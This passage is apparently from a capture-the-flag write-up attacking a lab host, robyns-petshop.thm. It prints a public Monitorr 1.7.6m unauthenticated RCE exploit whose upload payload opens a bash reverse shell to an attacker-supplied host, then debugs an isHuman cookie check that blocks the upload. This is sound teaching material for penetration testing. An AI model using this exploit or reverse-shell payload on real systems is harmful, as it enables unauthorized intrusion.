&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:~]
‚îî‚îÄ‚ïº &amp;gt;  searchsploit pico

------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
Epicor Enterprise 7.4 - Multiple Vulnerabilities      | asp/webapps/34864.txt
KMSpico 17.1.0.0 - 'Service KMSELDI' Unquoted Service | windows/local/49003.txt
Pico MP3 Player 1.0 - '.mp3' / '.pls' Local Crash (Po | windows/dos/11228.pl
Pico Zip 4.01 - 'Filename' Local Buffer Overflow      | windows/local/1917.pl
PicoFlat CMS 0.4.14 - 'index.php' Remote File Inclusi | php/webapps/4520.txt
PicoFlat CMS 0.5.9 (Windows) - Local File Inclusion   | php/webapps/5690.txt
PicoPhone Internet Phone 1.63 - Remote Buffer Overflo | hardware/dos/23876.txt
PicoPublisher 2.0 - SQL Injection                     | php/webapps/18670.txt
Picosafe Web GUI - Multiple Vulnerabilities           | php/webapps/40454.txt
University of Washington Pico 3.x/4.x - File Overwrit | linux/local/20493.sh
Working Resources BadBlue 2.55 - MFCISAPICommand Remo | windows/remote/25166.c
Working Resources BadBlue 2.55 - MFCISAPICommand Remo | windows/remote/25167.c
Yoggie Pico and Pico Pro Backticks - Remote Code Exec | cgi/webapps/30260.txt
------------------------------------------------------ ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The only exploit here that could be relevant is the &lt;code class=&quot;highlighter-rouge&quot;&gt;PicoFlat CMS 0.4.14 - 'index.php' Remote File Inclusion&lt;/code&gt; vulnerability. I tried searching for the version of PicoCMS that was being used by the server but couldn‚Äôt find anything- so I just tried to run the exploit anyway in the hope of it working.&lt;/p&gt;

&lt;p&gt;The reason I ignored the windows exploit is because we are fairly sure, based on the SSH banner, that the machine is ubuntu based. &lt;code class=&quot;highlighter-rouge&quot;&gt;OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Of course, it could have been  entirely possible that this was a trick, making use of a container to make us think we‚Äôre dealing with a linux machine - but I was fairly confident the machine wasn‚Äôt windows- and this turned out to be true. The windows exploit never would have worked.&lt;/p&gt;

&lt;p&gt;Unfortunately, the remote file inclusion exlpoit did not work either. Instead of trying to enumerate any directories or files, I decided to leave that as a last resort incase I didn‚Äôt find anything - and instead move onto the next subdomain&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://robyns-petshop.thm&quot;&gt;https://robyns-petshop.thm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;When I went to this subdomain, the first thing I noticed was the version number on the footer of the page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/monitorr-footer.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is also worth noting that the settings page of this site, underneath the login form has in small text the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User database dir: /var/www/monitorr/data
User database file: /var/www/monitorr/datausers.db
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I thought that this may be useful for elevating the privileges of our user once we gain access.&lt;/p&gt;

&lt;h1 id=&quot;finding-an-exploit&quot;&gt;Finding an exploit&lt;/h1&gt;

&lt;p&gt;Having a version number, we search for any known exploits:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:~]
‚îî‚îÄ‚ïº &amp;gt;  searchsploit monitorr 1.7.6

------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
Monitorr 1.7.6m - Authorization Bypass                | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Execution (Unauthentica | php/webapps/48980.py
------------------------------------------------------ ---------------------------------
Shellcodes: No results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The RCE looked like exactly what I needed to get user. Let‚Äôs take a look at the code:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
# -*- coding: UTF-8 -*-
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;specify params in format: python &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; target_url lhost lport&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/assets/php/upload.php&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/plain, */*; q=0.01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-Requested-With&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;XMLHttpRequest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Referer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-----------------------------31046105003900160576454225745&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Disposition: form-data; name=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;fileToUpload&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;; filename=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;she_ll.php&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Type: image/gif&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GIF89a213213123&amp;lt;?php shell_exec(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; 0&amp;gt;&amp;amp;1'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-----------------------------31046105003900160576454225745--&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A shell script should be uploaded. Now we try to execute it&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/assets/data/usrimg/she_ll.php&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Upgrade-Insecure-Requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, I tried the exploit, it didn‚Äôt work. After some light debugging, we can see why. Firstly, we know that the code is trying to upload a file to &lt;code class=&quot;highlighter-rouge&quot;&gt;/assets/data/usrimg/she_ll.php&lt;/code&gt;. However when we go here on the site, there aren‚Äôt any new files. Looking at the response from the server we can see why.&lt;/p&gt;

&lt;p&gt;First though, there are a few things to deal with.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;The script exists because the requests library returns an Exception. This is because the SSL certificate is self signed. This is easy to fix though, you can just set &lt;code class=&quot;highlighter-rouge&quot;&gt;verify=False&lt;/code&gt; in any request made.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;As for the SSL warnings, they can be disabled quite easily by adding the following code to the script&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib3.exceptions&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;category&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Anyway, here is the response from the server:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:/tmp/thm]
‚îî‚îÄ‚ïº &amp;gt;  python3 code.py https://monitorr.robyns-petshop.thm/ lhost lport
&amp;lt;div id='uploadreturn'&amp;gt;You are an exploit.&amp;lt;/div&amp;gt;&amp;lt;div id='uploaderror'&amp;gt;ERROR: she_ll.php was not uploaded.&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, we can assume based on the message alone that there is some kind of protection in place, against this attack. If we go through &lt;a href=&quot;https://github.com/Monitorr/Monitorr/releases/tag/1.7.6m&quot;&gt;the montiorr sourcecode&lt;/a&gt; There is no mention of this message anywhere. Based on this I assumed that it was part of the challenge, and that our goal was to bypass the protection somehow.&lt;/p&gt;

&lt;p&gt;First, I wanted to try fuzz the server, just to get an idea of what requests are, and aren‚Äôt allowed.
So to start off, I just sent a basic GET request to &lt;a href=&quot;https://monitorr.robyns-petshop.thm/assets/php/upload.php&quot;&gt;https://monitorr.robyns-petshop.thm/assets/php/upload.php&lt;/a&gt; - Here is what happened&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:/tmp/thm]
‚îî‚îÄ‚ïº &amp;gt;  curl https://monitorr.robyns-petshop.thm/assets/php/upload.php -k -v
*   Trying 3.249.19.222:443...
* TCP_NODELAY set
* Connected to monitorr.robyns-petshop.thm (3.249.19.222) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
*  start date: May  5 21:11:54 2021 GMT
*  expire date: May  5 21:11:54 2022 GMT
*  issuer: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
&amp;gt; GET /assets/php/upload.php HTTP/1.1
&amp;gt; Host: monitorr.robyns-petshop.thm
&amp;gt; User-Agent: curl/7.68.0
&amp;gt; Accept: */*
&amp;gt;
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
* Mark bundle as not supporting multiuse
&amp;lt; HTTP/1.1 200 OK
&amp;lt; Date: Wed, 05 May 2021 22:13:35 GMT
&amp;lt; Server: Apache/2.4.29 (Ubuntu)
&amp;lt; Vary: Accept-Encoding
&amp;lt; Content-Length: 173
&amp;lt; Content-Type: text/html; charset=UTF-8
&amp;lt;
* Connection #0 to host monitorr.robyns-petshop.thm left intact
&amp;lt;div id='uploadreturn'&amp;gt;You are an exploit.&amp;lt;/div&amp;gt;&amp;lt;div id='uploaderror'&amp;gt;ERROR: ../data/usrimg/ already exists.&amp;lt;/div&amp;gt;&amp;lt;div id='uploaderror'&amp;gt;ERROR:  was not uploaded.&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Immediately I was confused. Because if we send a GET, then it tells us that we‚Äôre an exploit. But, if we go to this same URL in our browser then we don‚Äôt get this response; we get this instead:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/monitorr-upload-php.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So, clearly, the request sent by our browser in different in some way.&lt;/p&gt;

&lt;p&gt;To find out what‚Äôs different, I simply used the firefox developer tools in order to copy the request as curl.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/monitorr-dev-tools.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;here is that curl request:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl 'https://monitorr.robyns-petshop.thm/assets/php/upload.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-GB,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Cookie: isHuman=1' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we want to neaten this up, and use it in our script. We can use a site like &lt;a href=&quot;https://curl.trillworks.com/&quot;&gt;https://curl.trillworks.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pasting that curl command into the site gives us this:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'isHuman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'User-Agent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'Accept'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'Accept-Language'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'en-GB,en;q=0.5'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'Connection'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'keep-alive'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'Upgrade-Insecure-Requests'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
